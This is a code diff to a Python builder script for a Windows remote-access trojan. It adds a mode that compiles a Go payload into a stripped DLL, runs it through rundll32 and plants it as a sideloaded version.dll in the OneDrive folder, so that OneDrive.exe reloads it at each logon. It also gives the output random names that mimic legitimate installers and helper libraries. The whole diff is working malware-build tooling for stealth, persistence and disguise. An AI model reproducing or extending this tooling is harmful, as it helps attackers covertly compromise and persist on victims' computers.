@@ -785,9 +785,14 @@ def log(msg, level="INFO"):
 
 def stage_compile_payload(raw_payload, xor_key, rc4_key, litterbox):
     with tempfile.TemporaryDirectory() as tmpdir:
-        src_path = os.path.join(tmpdir, "payload.go")
+        src_path = os.path.join(tmpdir, "main.go")
         with open(src_path, "w", encoding="utf-8") as f:
             f.write(raw_payload)
+
+        # Copy exe_main.go (provides func main for EXE builds)
+        exe_main_src = os.path.join(os.path.dirname(os.path.abspath(__file__)), "exe_main.go")
+        if os.path.exists(exe_main_src):
+            shutil.copy2(exe_main_src, os.path.join(tmpdir, "exe_main.go"))
 
         log("Initializing Go module...")
         subprocess.run(["go", "mod", "init", "payload"], cwd=tmpdir, capture_output=True)
@@ -802,7 +807,7 @@ def stage_compile_payload(raw_payload, xor_key, rc4_key, litterbox):
 
         log("Compiling (GOOS=windows, stripped, windowsgui)...")
         build = subprocess.run(
-            ["go", "build", "-ldflags", "-s -w -H windowsgui", "-o", out_path, "payload.go"],
+            ["go", "build", "-ldflags", "-s -w -H windowsgui", "-o", out_path, "."],
             cwd=tmpdir, capture_output=True, text=True, env=env,
         )
         if build.returncode != 0:
@@ -905,6 +910,83 @@ def stage_compile_stager(stager_dir, output_name):
 
 
 # ============================================================
+# DLL BUILD — compile payload as DLL with sideloading support
+# ============================================================
+
+def build_dll(raw_payload, output_name="payload.dll"):
+    """Build the payload as a DLL with version.dll proxy and OneDrive sideloading.
+
+    Usage: rundll32.exe payload.dll,EntryPoint
+    Stage 1: LOLBAS execution via rundll32 — copies itself to OneDrive dir + runs RAT
+    Stage 2: OneDrive.exe loads the sideloaded version.dll on next logon (persistence)
+    """
+    base_dir = os.path.dirname(os.path.abspath(__file__))
+
+    with tempfile.TemporaryDirectory() as tmpdir:
+        # Copy main agent source
+        with open(os.path.join(tmpdir, "main.go"), "w", encoding="utf-8") as f:
+            f.write(raw_payload)
+
+        # Copy DLL sideload source (version.dll proxy + entry points)
+        dll_src = os.path.join(base_dir, "dll_sideload.go")
+        if not os.path.exists(dll_src):
+            raise Exception("dll_sideload.go not found — required for DLL build")
+        shutil.copy2(dll_src, os.path.join(tmpdir, "dll_sideload.go"))
+
+        log("Initializing Go module...")
+        subprocess.run(["go", "mod", "init", "payload"], cwd=tmpdir, capture_output=True)
+        subprocess.run(["go", "get", "golang.org/x/sys/windows"], cwd=tmpdir, capture_output=True)
+        subprocess.run(["go", "mod", "tidy"], cwd=tmpdir, capture_output=True)
+
+        out_path = os.path.join(os.getcwd(), output_name)
+        env = os.environ.copy()
+        env["GOOS"] = "windows"
+        env["GOARCH"] = "amd64"
+        env["CGO_ENABLED"] = "1"
+
+        # Cross-compiler for CGO (required for c-shared DLL build)
+        cc = shutil.which("x86_64-w64-mingw32-gcc")
+        if not cc:
+            raise Exception(
+                "x86_64-w64-mingw32-gcc not found.\n"
+                "Install MinGW-w64: apt install gcc-mingw-w64-x86-64"
+            )
+        env["CC"] = cc
+
+        log("Compiling DLL (c-shared, CGO, stripped)...")
+        build = subprocess.run(
+            [
+                "go", "build",
+                "-buildmode=c-shared",
+                "-tags", "dll",
+                "-ldflags", "-s -w",
+                "-o", out_path,
+                ".",
+            ],
+            cwd=tmpdir, capture_output=True, text=True, env=env,
+        )
+        if build.returncode != 0:
+            raise Exception(f"DLL build failed:\n{build.stderr}")
+
+        if os.path.exists(out_path):
+            size = os.path.getsize(out_path)
+            log(f"SUCCESS: {output_name} ({size:,} bytes)", "OK")
+        else:
+            raise Exception("DLL binary not found after build")
+
+        # Clean up the .h header file that c-shared generates
+        header = out_path.replace(".dll", ".h")
+        if os.path.exists(header):
+            os.remove(header)
+
+    print()
+    log("=== DLL Build Complete ===", "OK")
+    log(f"Execute: rundll32.exe {output_name},EntryPoint", "OK")
+    log(f"Sideload target: %LOCALAPPDATA%\\Microsoft\\OneDrive\\version.dll", "OK")
+    log(f"Persistence: OneDrive.exe loads the DLL on next logon", "OK")
+
+
+# ============================================================
 # MAIN
 # ============================================================
 
@@ -918,7 +1000,22 @@ def main():
         raw_payload = f.read()
     log(f"Loaded payload: main.go ({len(raw_payload)} chars)", "OK")
 
-    # Output name — looks like a legitimate app installer/updater
+    # --- DLL build mode ---
+    if "--dll" in sys.argv:
+        dll_names = ["api", "helper", "runtime", "bridge", "sync"]
+        output_name = sys.argv[sys.argv.index("--dll") + 1] if len(sys.argv) > sys.argv.index("--dll") + 1 and not sys.argv[sys.argv.index("--dll") + 1].startswith("-") else f"{random.choice(dll_names)}.dll"
+        if not output_name.endswith(".dll"):
+            output_name += ".dll"
+        log(f"DLL build mode — output: {output_name}")
+        print()
+        try:
+            build_dll(raw_payload, output_name)
+        except Exception as e:
+            log(f"Stopped: {e}", "ERR")
+            sys.exit(1)
+        return
+
+    # --- Standard EXE stager pipeline ---
     name_prefixes = ["SetupHost", "Installer", "PkgSetup", "RuntimeSetup", "UpdateHelper"]
     output_name = f"{random.choice(name_prefixes)}_{random.randint(100, 999)}.exe"
     xor_key = generate_key(32)
